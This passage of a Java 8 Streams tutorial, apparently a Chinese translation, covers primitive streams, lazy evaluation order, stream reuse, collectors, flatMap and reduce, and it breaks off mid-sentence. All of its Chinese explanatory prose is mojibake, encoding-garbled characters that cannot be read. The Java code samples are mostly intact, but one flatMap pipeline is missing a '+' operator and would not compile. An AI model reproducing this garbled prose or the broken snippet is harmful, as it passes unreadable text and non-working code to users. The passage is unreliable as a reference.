æ‰€æœ‰è¿™äº›åŸºå…ƒæµéƒ½åƒæ™®é€šçš„å¯¹è±¡æµä¸€æ ·å·¥ä½œï¼Œæœ‰ä»¥ä¸‹ä¸åŒ:åŸºå…ƒæµä½¿ç”¨ç‰¹åŒ–çš„lambdaè¡¨è¾¾å¼ï¼Œä¾‹å¦‚ç”¨IntFunctionä»£æ›¿Functionï¼Œç”¨IntPredicateä»£æ›¿Predicateã€‚åŸå§‹æµæ”¯æŒé™„åŠ çš„ç»ˆç«¯èšåˆæ“ä½œsum()å’Œaverage(): Arrays.stream(new int[] &#123;1, 2, 3&#125;) .map(n -> 2 * n + 1) .average() .ifPresent(System.out::println); // 5.0 æœ‰æ—¶å°†å¸¸è§„å¯¹è±¡æµè½¬æ¢ä¸ºåŸºæœ¬æµå¾ˆæœ‰ç”¨ï¼Œåä¹‹äº¦ç„¶ã€‚ä¸ºæ­¤ï¼Œå¯¹è±¡æµæ”¯æŒç‰¹æ®Šçš„æ˜ å°„æ“ä½œmapToInt()ã€mapToLong()å’ŒmapToDouble: Stream.of(\"a1\", \"a2\", \"a3\") .map(s -> s.substring(1)) .mapToInt(Integer::parseInt) .max() .ifPresent(System.out::println); // 3 åŸå§‹æµå¯ä»¥é€šè¿‡mapToObj()è½¬æ¢ä¸ºå¯¹è±¡æµ: IntStream.range(1, 4) .mapToObj(i -> \"a\" + i) .forEach(System.out::println); // a1 // a2 // a3 ä¸‹é¢æ˜¯ä¸€ä¸ªç»„åˆçš„ä¾‹å­:doubleç±»å‹çš„æµé¦–å…ˆæ˜ å°„åˆ°intç±»å‹çš„æµï¼Œç„¶åå†æ˜ å°„åˆ°stringç±»å‹çš„å¯¹è±¡æµ: Stream.of(1.0, 2.0, 3.0) .mapToInt(Double::intValue) .mapToObj(i -> \"a\" + i) .forEach(System.out::println); // a1 // a2 // a3 å¤„ç†æ¬¡åº(Processing Order) ç°åœ¨ï¼Œæˆ‘ä»¬å·²ç»å­¦ä¹ äº†å¦‚ä½•åˆ›å»ºå’Œä½¿ç”¨ä¸åŒç±»å‹çš„æµï¼Œè®©æˆ‘ä»¬æ·±å…¥äº†è§£å¦‚ä½•åœ¨å¹•åå¤„ç†æµæ“ä½œã€‚ä¸­é—´æ“ä½œçš„ä¸€ä¸ªé‡è¦ç‰¹å¾æ˜¯æƒ°æ€§ã€‚çœ‹çœ‹è¿™ä¸ªä¾‹å­ï¼Œè¿™é‡Œç¼ºå°‘äº†ä¸€ä¸ªç»ˆç«¯æ“ä½œ: Stream.of(\"d2\", \"a2\", \"b1\", \"b3\", \"c\") .filter(s -> &#123; System.out.println(\"filter: \" + s); return true; &#125;); åœ¨æ‰§è¡Œæ­¤ä»£ç ç‰‡æ®µæ—¶ï¼Œä¸ä¼šå°†ä»»ä½•å†…å®¹æ‰“å°åˆ°æ§åˆ¶å°ã€‚è¿™æ˜¯å› ä¸ºåªæœ‰åœ¨å­˜åœ¨ç»ˆç«¯æ“ä½œæ—¶æ‰ä¼šæ‰§è¡Œä¸­é—´æ“ä½œã€‚ è®©æˆ‘ä»¬é€šè¿‡ç»ˆç«¯æ“ä½œforEachæ¥æ‰©å±•ä¸Šé¢çš„ç¤ºä¾‹: Stream.of(\"d2\", \"a2\", \"b1\", \"b3\", \"c\") .filter(s -> &#123; System.out.println(\"filter: \" + s); return true; &#125;) .forEach(s -> System.out.println(\"forEach: \" + s)); æ‰§è¡Œæ­¤ä»£ç ç‰‡æ®µä¼šåœ¨æ§åˆ¶å°ä¸Šäº§ç”Ÿæ‰€éœ€çš„è¾“å‡º: filter: d2 forEach: d2 filter: a2 forEach: a2 filter: b1 forEach: b1 filter: b3 forEach: b3 filter: c forEach: c ç»“æœçš„é¡ºåºå¯èƒ½ä¼šä»¤äººæƒŠè®¶ã€‚ä¸€ç§ç®€å•çš„æ–¹æ³•æ˜¯åœ¨æµçš„æ‰€æœ‰å…ƒç´ ä¸Šä¸€ä¸ªæ¥ä¸€ä¸ªåœ°æ°´å¹³æ‰§è¡Œæ“ä½œ.ä½†æ˜¯æ¯ä¸ªå…ƒç´ éƒ½æ²¿ç€é“¾å‚ç›´ç§»åŠ¨ã€‚ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸²â€œd2â€ä¼ é€’filterç„¶åforEachï¼Œåªæœ‰è¿™æ ·ç¬¬äºŒä¸ªå­—ç¬¦ä¸²â€œa2â€æ‰ä¼šè¢«å¤„ç†ã€‚ è¿™ç§è¡Œä¸ºå¯ä»¥å‡å°‘å¯¹æ¯ä¸ªå…ƒç´ æ‰§è¡Œçš„å®é™…æ“ä½œæ•°ï¼Œåœ¨ä¸‹ä¸€ä¸ªä¾‹å­ä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°: Stream.of(\"d2\", \"a2\", \"b1\", \"b3\", \"c\") .map(s -> &#123; System.out.println(\"map: \" + s); return s.toUpperCase(); &#125;) .anyMatch(s -> &#123; System.out.println(\"anyMatch: \" + s); return s.startsWith(\"A\"); &#125;); // map: d2 // anyMatch: D2 // map: a2 // anyMatch: A2 åªè¦è°“è¯åº”ç”¨äºç»™å®šçš„è¾“å…¥å…ƒç´ ï¼ŒanyMatchæ“ä½œå°±è¿”å›trueã€‚å¯¹äºä¼ é€’ç»™â€œA2â€çš„ç¬¬äºŒä¸ªå…ƒç´ æ˜¯è¿™æ ·çš„ã€‚ç”±äºæµé“¾æ˜¯å‚ç›´æ‰§è¡Œçš„ï¼Œæ‰€ä»¥åœ¨è¿™ç§æƒ…å†µä¸‹åªéœ€è¦æ‰§è¡Œä¸¤æ¬¡mapã€‚å› æ­¤ï¼Œä¸æ˜¯æ˜ å°„æµçš„æ‰€æœ‰å…ƒç´ ï¼Œè€Œæ˜¯å°½å¯èƒ½å°‘åœ°è°ƒç”¨mapã€‚ Why order matters ä¸‹ä¸€ä¸ªç¤ºä¾‹åŒ…å«ä¸¤ä¸ªä¸­é—´æ“ä½œmapå’Œfilterä»¥åŠç»ˆç«¯æ“ä½œforEachã€‚è®©æˆ‘ä»¬å†æ¬¡æ£€æŸ¥è¿™äº›æ“ä½œæ˜¯å¦‚ä½•æ‰§è¡Œçš„: Stream.of(\"d2\", \"a2\", \"b1\", \"b3\", \"c\") .map(s -> &#123; System.out.println(\"map: \" + s); return s.toUpperCase(); &#125;) .filter(s -> &#123; System.out.println(\"filter: \" + s); return s.startsWith(\"A\"); &#125;) .forEach(s -> System.out.println(\"forEach: \" + s)); // map: d2 // filter: D2 // map: a2 // filter: A2 // forEach: A2 // map: b1 // filter: B1 // map: b3 // filter: B3 // map: c // filter: C æ‚¨å¯èƒ½å·²ç»çŒœåˆ°ï¼Œå¯¹äºåº•å±‚é›†åˆä¸­çš„æ¯ä¸ªå­—ç¬¦ä¸²ï¼Œmapå’Œfilteréƒ½è¢«è°ƒç”¨5æ¬¡ï¼Œè€ŒforEachåªè¢«è°ƒç”¨ä¸€æ¬¡ã€‚ å¦‚æœæˆ‘ä»¬æ”¹å˜æ“ä½œçš„é¡ºåºï¼Œå°†filterç§»åˆ°é“¾çš„å¼€å¤´ï¼Œå°±å¯ä»¥å¤§å¤§å‡å°‘å®é™…æ‰§è¡Œçš„æ¬¡æ•°: Stream.of(\"d2\", \"a2\", \"b1\", \"b3\", \"c\") .filter(s -> &#123; System.out.println(\"filter: \" + s); return s.startsWith(\"a\"); &#125;) .map(s -> &#123; System.out.println(\"map: \" + s); return s.toUpperCase(); &#125;) .forEach(s -> System.out.println(\"forEach: \" + s)); // filter: d2 // filter: a2 // map: a2 // forEach: A2 // filter: b1 // filter: b3 // filter: c ç°åœ¨ï¼Œmapåªè¢«è°ƒç”¨ä¸€æ¬¡ï¼Œæ‰€ä»¥å¯¹äºå¤§é‡è¾“å…¥å…ƒç´ ï¼Œæ“ä½œç®¡é“çš„æ‰§è¡Œé€Ÿåº¦è¦å¿«å¾—å¤šã€‚åœ¨ç¼–å†™å¤æ‚çš„æ–¹æ³•é“¾æ—¶ï¼Œè¯·è®°ä½è¿™ä¸€ç‚¹ã€‚ è®©æˆ‘ä»¬é€šè¿‡ä¸€ä¸ªé¢å¤–çš„æ“ä½œæ¥æ‰©å±•ä¸Šé¢çš„ä¾‹å­ï¼Œsorted: Stream.of(\"d2\", \"a2\", \"b1\", \"b3\", \"c\") .sorted((s1, s2) -> &#123; System.out.printf(\"sort: %s; %s\\n\", s1, s2); return s1.compareTo(s2); &#125;) .filter(s -> &#123; System.out.println(\"filter: \" + s); return s.startsWith(\"a\"); &#125;) .map(s -> &#123; System.out.println(\"map: \" + s); return s.toUpperCase(); &#125;) .forEach(s -> System.out.println(\"forEach: \" + s)); æ’åºæ˜¯ä¸€ç§ç‰¹æ®Šçš„ä¸­é—´æ“ä½œã€‚è¿™æ˜¯ä¸€ä¸ªæ‰€è°“çš„æœ‰çŠ¶æ€æ“ä½œï¼Œå› ä¸ºä¸ºäº†å¯¹å…ƒç´ é›†åˆæ’åºï¼Œæ‚¨å¿…é¡»åœ¨æ’åºæœŸé—´ä¿æŒçŠ¶æ€ã€‚ æ‰§è¡Œè¿™ä¸ªç¤ºä¾‹ä¼šå¾—åˆ°ä»¥ä¸‹æ§åˆ¶å°è¾“å‡º: sort: a2; d2 sort: b1; a2 sort: b1; d2 sort: b1; a2 sort: b3; b1 sort: b3; d2 sort: c; b3 sort: c; d2 filter: a2 map: a2 forEach: A2 filter: b1 filter: b3 filter: c filter: d2 é¦–å…ˆï¼Œå¯¹æ•´ä¸ªè¾“å…¥é›†åˆæ‰§è¡Œæ’åºæ“ä½œã€‚æ¢å¥è¯è¯´ï¼Œæ’åºæ˜¯æ°´å¹³æ‰§è¡Œçš„ã€‚æ‰€ä»¥åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå¯¹äºè¾“å…¥é›†åˆä¸­çš„æ¯ä¸ªå…ƒç´ çš„å¤šä¸ªç»„åˆï¼Œsortedè¢«è°ƒç”¨8æ¬¡ã€‚ å†ä¸€æ¬¡ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡é‡æ–°æ’åºé“¾æ¥ä¼˜åŒ–æ€§èƒ½: Stream.of(\"d2\", \"a2\", \"b1\", \"b3\", \"c\") .filter(s -> &#123; System.out.println(\"filter: \" + s); return s.startsWith(\"a\"); &#125;) .sorted((s1, s2) -> &#123; System.out.printf(\"sort: %s; %s\\n\", s1, s2); return s1.compareTo(s2); &#125;) .map(s -> &#123; System.out.println(\"map: \" + s); return s.toUpperCase(); &#125;) .forEach(s -> System.out.println(\"forEach: \" + s)); // filter: d2 // filter: a2 // filter: b1 // filter: b3 // filter: c // map: a2 // forEach: A2 åœ¨æœ¬ä¾‹ä¸­ï¼Œä»æœªè°ƒç”¨sortedï¼Œå› ä¸ºfilterå°†è¾“å…¥é›†åˆå‡å°‘åˆ°åªæœ‰ä¸€ä¸ªå…ƒç´ ã€‚å› æ­¤ï¼Œå¯¹äºæ›´å¤§çš„è¾“å…¥é›†åˆï¼Œæ€§èƒ½ä¼šå¤§å¤§æé«˜ å¤ç”¨æµ(Reusing Streams) Java 8æµä¸èƒ½è¢«é‡ç”¨ã€‚å½“ä½ è°ƒç”¨ä»»ä½•ç»ˆç«¯æ“ä½œæ—¶ï¼Œæµå°±ä¼šè¢«å…³é—­: Stream&lt;String> stream = Stream.of(\"d2\", \"a2\", \"b1\", \"b3\", \"c\") .filter(s -> s.startsWith(\"a\")); stream.anyMatch(s -> true); // ok stream.noneMatch(s -> true); // exception åœ¨åŒä¸€ä¸ªæµçš„anyMatchä¹‹åè°ƒç”¨nonmatchä¼šå¯¼è‡´ä»¥ä¸‹å¼‚å¸¸: java.lang.IllegalStateException: stream has already been operated upon or closed at java.util.stream.AbstractPipeline.evaluate(AbstractPipeline.java:229) at java.util.stream.ReferencePipeline.noneMatch(ReferencePipeline.java:459) at com.winterbe.java8.Streams5.test7(Streams5.java:38) at com.winterbe.java8.Streams5.main(Streams5.java:28) ä¸ºäº†å…‹æœè¿™ä¸ªé™åˆ¶ï¼Œæˆ‘ä»¬å¿…é¡»ä¸ºæƒ³è¦æ‰§è¡Œçš„æ¯ä¸ªç»ˆç«¯æ“ä½œåˆ›å»ºä¸€ä¸ªæ–°çš„æµé“¾ï¼Œä¾‹å¦‚ï¼Œæˆ‘ä»¬å¯ä»¥åˆ›å»ºä¸€ä¸ªæµä¾›åº”å•†æ¥æ„é€ ä¸€ä¸ªæ‰€æœ‰ä¸­é—´æ“ä½œéƒ½å·²ç»è®¾ç½®å¥½çš„æ–°æµ: Supplier&lt;Stream&lt;String>> streamSupplier = () -> Stream.of(\"d2\", \"a2\", \"b1\", \"b3\", \"c\") .filter(s -> s.startsWith(\"a\"));streamSupplier.get().anyMatch(s -> true); // okstreamSupplier.get().noneMatch(s -> true); // ok å¯¹get()çš„æ¯æ¬¡è°ƒç”¨éƒ½ä¼šæ„é€ ä¸€ä¸ªæ–°æµï¼Œæˆ‘ä»¬å°†åœ¨å…¶ä¸Šä¿å­˜ä»¥è°ƒç”¨æ‰€éœ€çš„ç»ˆç«¯æ“ä½œã€‚ é«˜çº§æ“ä½œ(Advanced Operations) æµæ”¯æŒè®¸å¤šä¸åŒçš„æ“ä½œã€‚æˆ‘ä»¬å·²ç»å­¦ä¹ äº†æœ€é‡è¦çš„æ“ä½œï¼Œå¦‚filteræˆ–mapã€‚æˆ‘æŠŠæ‰€æœ‰å…¶ä»–å¯ç”¨çš„æ“ä½œç•™ç»™æ‚¨å»å‘ç°(è¯·å‚é˜…Stream Javadoc)ã€‚ç›¸åï¼Œè®©æˆ‘ä»¬æ·±å…¥ç ”ç©¶æ›´å¤æ‚çš„æ“ä½œæ”¶é›†ã€flatMapå’Œreduceã€‚ æœ¬èŠ‚ä¸­çš„å¤§å¤šæ•°ä»£ç ç¤ºä¾‹ä½¿ç”¨ä»¥ä¸‹äººå‘˜åˆ—è¡¨è¿›è¡Œæ¼”ç¤º: class Person &#123; String name; int age; Person(String name, int age) &#123; this.name = name; this.age = age; &#125; @Override public String toString() &#123; return name; &#125; &#125; List&lt;Person> persons = Arrays.asList( new Person(\"Max\", 18), new Person(\"Peter\", 23), new Person(\"Pamela\", 23), new Person(\"David\", 12)); Collect Collectæ˜¯ä¸€ä¸ªéå¸¸æœ‰ç”¨çš„ç»ˆç«¯æ“ä½œï¼Œå¯ä»¥å°†æµçš„å…ƒç´ è½¬æ¢ä¸ºå¦ä¸€ç§ç»“æœï¼Œä¾‹å¦‚: list,map,set.Collectæ¥å—Collectorï¼Œæ”¶é›†å™¨ç”±å››ç§ä¸åŒçš„æ“ä½œç»„æˆ:ä¾›åº”å•†(supplier)ã€ç´¯åŠ å™¨( accumulator)ã€åˆå¹¶å™¨(combiner)å’Œæ”¶å°¾å™¨(finisher)ã€‚ä¹ä¸€å¬ï¼Œè¿™å¬èµ·æ¥éå¸¸å¤æ‚ï¼Œä½†å¥½çš„éƒ¨åˆ†æ˜¯Java 8é€šè¿‡collectorç±»æ”¯æŒå„ç§å†…ç½®æ”¶é›†å™¨ã€‚æ‰€ä»¥å¯¹äºæœ€å¸¸è§çš„æ“ä½œï¼Œä½ ä¸éœ€è¦è‡ªå·±å®ç°æ”¶é›†å™¨ã€‚ è®©æˆ‘ä»¬ä»ä¸€ä¸ªéå¸¸å¸¸è§çš„ç”¨ä¾‹å¼€å§‹: List&lt;Person> filtered = persons .stream() .filter(p -> p.name.startsWith(\"P\")) .collect(Collectors.toList());System.out.println(filtered); // [Peter, Pamela] å¦‚æ‚¨æ‰€è§ï¼Œä»æµçš„å…ƒç´ æ„é€ ä¸€ä¸ªåˆ—è¡¨éå¸¸ç®€å•ã€‚éœ€è¦ä¸€ä¸ªé›†åˆè€Œä¸æ˜¯åˆ—è¡¨-åªéœ€ä½¿ç”¨collections . toset()ã€‚ ä¸‹ä¸€ä¸ªä¾‹å­å°†æ‰€æœ‰äººæŒ‰å¹´é¾„åˆ†ç»„: Map&lt;Integer, List&lt;Person>> personsByAge = persons .stream() .collect(Collectors.groupingBy(p -> p.age)); personsByAge .forEach((age, p) -> System.out.format(\"age %s: %s\\n\", age, p)); // age 18: [Max] // age 23: [Peter, Pamela] // age 12: [David] Collectorsæ˜¯éå¸¸å¤šæ‰å¤šè‰ºçš„ã€‚ä½ ä¹Ÿå¯ä»¥åˆ›å»ºæµå…ƒç´ çš„èšåˆï¼Œ ä¾‹å¦‚ç¡®å®šæ‰€æœ‰äººçš„å¹³å‡å¹´é¾„: Double averageAge = persons .stream() .collect(Collectors.averagingInt(p -> p.age)); System.out.println(averageAge); // 19.0 å¦‚æœæ‚¨å¯¹æ›´å…¨é¢çš„ç»Ÿè®¡ä¿¡æ¯æ„Ÿå…´è¶£ï¼Œæ±‡æ€»æ”¶é›†å™¨å°†è¿”å›ä¸€ä¸ªç‰¹æ®Šçš„å†…ç½®æ±‡æ€»ç»Ÿè®¡ä¿¡æ¯å¯¹è±¡ã€‚å› æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥ç®€å•åœ°ç¡®å®šäººå‘˜çš„æœ€å°å¹´é¾„ï¼Œæœ€å¤§å¹´é¾„å’Œç®—æœ¯å¹³å‡å¹´é¾„ä»¥åŠæ€»å’Œå’Œè®¡æ•°ã€‚ IntSummaryStatistics ageSummary = persons .stream() .collect(Collectors.summarizingInt(p -> p.age));System.out.println(ageSummary);// IntSummaryStatistics&#123;count=4, sum=76, min=12, average=19.000000, max=23&#125; ä¸‹ä¸€ä¸ªä¾‹å­å°†æ‰€æœ‰äººè¿æ¥åˆ°ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­: String phrase = persons .stream() .filter(p -> p.age >= 18) .map(p -> p.name) .collect(Collectors.joining(\" and \", \"In Germany \", \" are of legal age.\"));System.out.println(phrase);// In Germany Max and Peter and Pamela are of legal age. è¿æ¥æ”¶é›†å™¨æ¥å—åˆ†éš”ç¬¦ä»¥åŠå¯é€‰çš„å‰ç¼€å’Œåç¼€ã€‚ ä¸ºäº†å°†æµå…ƒç´ è½¬æ¢ä¸ºæ˜ å°„ï¼Œæˆ‘ä»¬å¿…é¡»æŒ‡å®šé”®å’Œå€¼åº”è¯¥å¦‚ä½•æ˜ å°„ã€‚è¯·è®°ä½ï¼Œæ˜ å°„çš„é”®å¿…é¡»æ˜¯å”¯ä¸€çš„ï¼Œå¦åˆ™æŠ›å‡ºIllegalStateExceptionã€‚æ‚¨å¯ä»¥é€‰æ‹©å°†mergeå‡½æ•°ä½œä¸ºé™„åŠ å‚æ•°ä¼ é€’ï¼Œä»¥ç»•è¿‡å¼‚å¸¸: Map&lt;Integer, String> map = persons .stream() .collect(Collectors.toMap( p -> p.age, p -> p.name, (name1, name2) -> name1 + \";\" + name2));System.out.println(map);// &#123;18=Max, 23=Peter;Pamela, 12=David&#125; ç°åœ¨æˆ‘ä»¬å·²ç»äº†è§£äº†ä¸€äº›æœ€å¼ºå¤§çš„å†…ç½®æ”¶é›†å™¨ï¼Œè®©æˆ‘ä»¬å°è¯•æ„å»ºè‡ªå·±çš„ç‰¹æ®Šæ”¶é›†å™¨ã€‚æˆ‘ä»¬æƒ³è¦å°†æµä¸­çš„æ‰€æœ‰äººè½¬æ¢ä¸ºå•ä¸ªå­—ç¬¦ä¸²ï¼Œè¯¥å­—ç¬¦ä¸²ç”±ä»¥|ç®¡é“å­—ç¬¦åˆ†éš”çš„æ‰€æœ‰å¤§å†™å­—æ¯ç»„æˆã€‚ ä¸ºäº†å®ç°è¿™ä¸€ç‚¹ï¼Œæˆ‘ä»¬é€šè¿‡collector .of()åˆ›å»ºä¸€ä¸ªæ–°çš„æ”¶é›†å™¨ã€‚æˆ‘ä»¬å¿…é¡»ä¼ é€’æ”¶é›†å™¨çš„å››ä¸ªç»„æˆéƒ¨åˆ†:ä¾›åº”å•†(supplier)ã€ç´¯åŠ å™¨( accumulator)ã€åˆå¹¶å™¨(combiner)å’Œæ”¶å°¾å™¨(finisher) Collector&lt;Person, StringJoiner, String> personNameCollector = Collector.of( () -> new StringJoiner(\" | \"), // supplier (j, p) -> j.add(p.name.toUpperCase()), // accumulator (j1, j2) -> j1.merge(j2), // combiner StringJoiner::toString); // finisherString names = persons .stream() .collect(personNameCollector);System.out.println(names); // MAX | PETER | PAMELA | DAVID ç”±äºJavaä¸­çš„å­—ç¬¦ä¸²æ˜¯ä¸å¯å˜çš„ï¼Œæˆ‘ä»¬éœ€è¦ä¸€ä¸ªåƒStringJoinerè¿™æ ·çš„helperç±»æ¥è®©æ”¶é›†å™¨æ„é€ æˆ‘ä»¬çš„å­—ç¬¦ä¸²ã€‚æä¾›è€…æœ€åˆæ„é€ è¿™æ ·ä¸€ä¸ªå¸¦æœ‰é€‚å½“åˆ†éš”ç¬¦çš„StringJoinerã€‚ç´¯åŠ å™¨ç”¨äºå°†æ¯ä¸ªäººçš„å¤§å†™åç§°æ·»åŠ åˆ°StringJoinerä¸­ã€‚ç»„åˆå™¨çŸ¥é“å¦‚ä½•å°†ä¸¤ä¸ªStringJoinersåˆå¹¶ä¸ºä¸€ä¸ªã€‚åœ¨æœ€åä¸€æ­¥ä¸­ï¼Œå®Œæˆå™¨ä»StringJoineræ„é€ æ‰€éœ€çš„å­—ç¬¦ä¸²ã€‚ FlatMap æˆ‘ä»¬å·²ç»å­¦ä¹ äº†å¦‚ä½•åˆ©ç”¨mapæ“ä½œå°†æµçš„å¯¹è±¡è½¬æ¢ä¸ºå¦ä¸€ç§ç±»å‹çš„å¯¹è±¡ã€‚Mapæœ‰ä¸€å®šçš„å±€é™æ€§ï¼Œå› ä¸ºæ¯ä¸ªå¯¹è±¡åªèƒ½æ˜ å°„åˆ°å¦ä¸€ä¸ªå¯¹è±¡ã€‚ä½†æ˜¯ï¼Œå¦‚æœæˆ‘ä»¬æƒ³å°†ä¸€ä¸ªå¯¹è±¡è½¬æ¢ä¸ºå¤šä¸ªå…¶ä»–å¯¹è±¡ï¼Œæˆ–è€…æ ¹æœ¬ä¸è½¬æ¢è¯¥æ€ä¹ˆåŠå‘¢?è¿™å°±æ˜¯flatMapçš„æ•‘æ˜Ÿã€‚ FlatMapå°†æµçš„æ¯ä¸ªå…ƒç´ è½¬æ¢ä¸ºå…¶ä»–å¯¹è±¡çš„æµã€‚å› æ­¤ï¼Œæ¯ä¸ªå¯¹è±¡å°†è¢«è½¬æ¢ä¸º0ä¸ªã€ä¸€ä¸ªæˆ–å¤šä¸ªç”±æµæ”¯æŒçš„å…¶ä»–å¯¹è±¡ã€‚è¿™äº›æµçš„å†…å®¹å°†è¢«æ”¾ç½®åˆ°flatMapæ“ä½œè¿”å›çš„æµä¸­ã€‚ åœ¨æˆ‘ä»¬çœ‹åˆ°flatMapçš„å®é™…åº”ç”¨ä¹‹å‰ï¼Œæˆ‘ä»¬éœ€è¦ä¸€ä¸ªé€‚å½“çš„ç±»å‹å±‚æ¬¡ç»“æ„: class Foo &#123; String name; List&lt;Bar> bars = new ArrayList&lt;>(); Foo(String name) &#123; this.name = name; &#125; &#125; class Bar &#123; String name; Bar(String name) &#123; this.name = name; &#125; &#125; æˆ‘ä»¬åˆ©ç”¨æˆ‘ä»¬å…³äºæµçš„çŸ¥è¯†æ¥å®ä¾‹åŒ–å‡ ä¸ªå¯¹è±¡: List&lt;Foo> foos = new ArrayList&lt;>(); // create foos IntStream .range(1, 4) .forEach(i -> foos.add(new Foo(\"Foo\" + i))); // create bars foos.forEach(f -> IntStream .range(1, 4) .forEach(i -> f.bars.add(new Bar(\"Bar\" + i + \" &lt;- \" + f.name)))); ç°åœ¨æˆ‘ä»¬æœ‰ä¸€ä¸ªåŒ…å«ä¸‰ä¸ªfooçš„åˆ—è¡¨ï¼Œæ¯ä¸ªfooç”±ä¸‰ä¸ªbarç»„æˆã€‚ FlatMapæ¥å—ä¸€ä¸ªå¿…é¡»è¿”å›å¯¹è±¡æµçš„å‡½æ•°ã€‚å› æ­¤ï¼Œä¸ºäº†è§£ææ¯ä¸ªfooçš„barå¯¹è±¡ï¼Œæˆ‘ä»¬åªéœ€ä¼ é€’é€‚å½“çš„å‡½æ•°: foos.stream() .flatMap(f -> f.bars.stream()) .forEach(b -> System.out.println(b.name)); // Bar1 &lt;- Foo1 // Bar2 &lt;- Foo1 // Bar3 &lt;- Foo1 // Bar1 &lt;- Foo2 // Bar2 &lt;- Foo2 // Bar3 &lt;- Foo2 // Bar1 &lt;- Foo3 // Bar2 &lt;- Foo3 // Bar3 &lt;- Foo3 æ­£å¦‚æ‚¨æ‰€çœ‹åˆ°çš„ï¼Œæˆ‘ä»¬å·²ç»æˆåŠŸåœ°å°†ä¸‰ä¸ªfooå¯¹è±¡çš„æµè½¬æ¢ä¸ºä¹ä¸ªbarå¯¹è±¡çš„æµã€‚ æœ€åï¼Œä¸Šé¢çš„ä»£ç ç¤ºä¾‹å¯ä»¥ç®€åŒ–ä¸ºä¸€ä¸ªæµæ“ä½œçš„å•ä¸€ç®¡é“: IntStream.range(1, 4) .mapToObj(i -> new Foo(\"Foo\" + i)) .peek(f -> IntStream.range(1, 4) .mapToObj(i -> new Bar(\"Bar\" + i + \" &lt;- \" f.name)) .forEach(f.bars::add)) .flatMap(f -> f.bars.stream()) .forEach(b -> System.out.println(b.name)); FlatMapä¹Ÿé€‚ç”¨äºJava 8ä¸­å¼•å…¥çš„Optionalç±»ã€‚flatMapæ“ä½œè¿”å›å¦ä¸€ç§ç±»å‹çš„å¯é€‰å¯¹è±¡ã€‚å› æ­¤å¯ä»¥åˆ©ç”¨å®ƒæ¥é˜²æ­¢è®¨åŒçš„ç©ºæ£€æŸ¥ã€‚ æƒ³æƒ³è¿™æ ·ä¸€ä¸ªé«˜åº¦åˆ†å±‚çš„ç»“æ„: class Outer &#123; Nested nested;&#125;class Nested &#123; Inner inner;&#125;class Inner &#123; String foo;&#125; ä¸ºäº†è§£æå¤–éƒ¨å®ä¾‹çš„å†…éƒ¨å­—ç¬¦ä¸²fooï¼Œä½ å¿…é¡»æ·»åŠ å¤šä¸ªç©ºæ£€æŸ¥æ¥é˜²æ­¢å¯èƒ½çš„nullpointerexception: Outer outer = new Outer();if (outer != null &amp;&amp; outer.nested != null &amp;&amp; outer.nested.inner != null) &#123; System.out.println(outer.nested.inner.foo);&#125; åŒæ ·çš„è¡Œä¸ºå¯ä»¥é€šè¿‡ä½¿ç”¨å¯é€‰çš„flatMapæ“ä½œè·å¾—: Optional.of(new Outer()) .flatMap(o -> Optional.ofNullable(o.nested)) .flatMap(n -> Optional.ofNullable(n.inner)) .flatMap(i -> Optional.ofNullable(i.foo)) .ifPresent(System.out::println); å¯¹flatMapçš„æ¯æ¬¡è°ƒç”¨è¿”å›ä¸€ä¸ªå¯é€‰çš„åŒ…è£…(å¦‚æœå­˜åœ¨)æ‰€éœ€å¯¹è±¡ï¼Œå¦‚æœä¸å­˜åœ¨åˆ™è¿”å›nullã€‚ Reduce reduceæ“ä½œå°†æµçš„æ‰€æœ‰å…ƒç´ åˆå¹¶ä¸ºä¸€ä¸ªç»“æœã€‚Java 8æ”¯æŒä¸‰ç§ä¸åŒçš„reduceæ–¹æ³•ã€‚ç¬¬ä¸€ç§æ–¹æ³•å°†å…ƒç´ æµç¼©å‡ä¸ºæµä¸­çš„ä¸€ä¸ªå…ƒç´ ã€‚ è®©æˆ‘ä»¬çœ‹çœ‹å¦‚ä½•ä½¿ç”¨è¿™ä¸ªæ–¹æ³•æ¥ç¡®å®šæœ€å¹´é•¿çš„äºº: persons .stream() .reduce((p1, p2) -> p1.age > p2.age ? p1 : p2) .ifPresent(System.out::println); // Pamela reduceæ–¹æ³•æ¥å—ä¸€ä¸ªBinaryOperatorç´¯åŠ å™¨å‡½æ•°ã€‚è¿™å®é™…ä¸Šæ˜¯ä¸€ä¸ªBiFunctionï¼Œå…¶ä¸­ä¸¤ä¸ªæ“ä½œæ•°å…±äº«åŒä¸€ç±»å‹ï¼Œåœ¨è¿™é‡Œæ˜¯Personã€‚BiFunctionsç±»ä¼¼äºFunctionï¼Œä½†æ¥å—ä¸¤ä¸ªå‚æ•°ã€‚ç¤ºä¾‹å‡½æ•°æ¯”è¾ƒä¸¤ä¸ªäººçš„å¹´é¾„ï¼Œä»¥ä¾¿è¿”å›å…·æœ‰æœ€å¤§å¹´é¾„çš„äººã€‚ ç¬¬äºŒä¸ªreduceæ–¹æ³•åŒæ—¶æ¥å—æ ‡è¯†å€¼å’ŒBinaryOperatorç´¯åŠ å™¨ã€‚è¯¥æ–¹æ³•å¯ç”¨äºæ„é€ ä¸€ä¸ªæ–°çš„Personï¼Œ è¯¥Personå…·æœ‰æ¥è‡ªæµä¸­æ‰€æœ‰å…¶ä»–äººå‘˜çš„èšåˆåç§°å’Œå¹´é¾„: Person result = persons .stream() .reduce(new Person(\"\", 0), (p1, p2) -> &#123; p1.age += p2.age; p1.name += p2.name; return p1; &#125;); System.out.format(\"name=%s; age=%s\", result.name, result.age); // name=MaxPeterPamelaDavid; age=76 ç¬¬ä¸‰ä¸ªreduceæ–¹æ³•æ¥å—ä¸‰ä¸ªå‚æ•°:ä¸€ä¸ªæ ‡è¯†å€¼ã€ä¸€ä¸ªBiFunctionç´¯åŠ å™¨å’Œä¸€ä¸ªBinaryOperatorç±»å‹çš„ç»„åˆå‡½æ•°ã€‚å› ä¸ºèº«ä»½å€¼ç±»å‹ä¸é™äºPersonç±»å‹ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªçº¦ç®€æ¥ç¡®å®šæ‰€æœ‰äººçš„å¹´é¾„æ€»å’Œ: Integer ageSum = persons .stream() .reduce(0, (sum, p) -> sum += p.age, (sum1, sum2) -> sum1 + sum2);System.out.println(ageSum); // 76 æ­£å¦‚ä½ 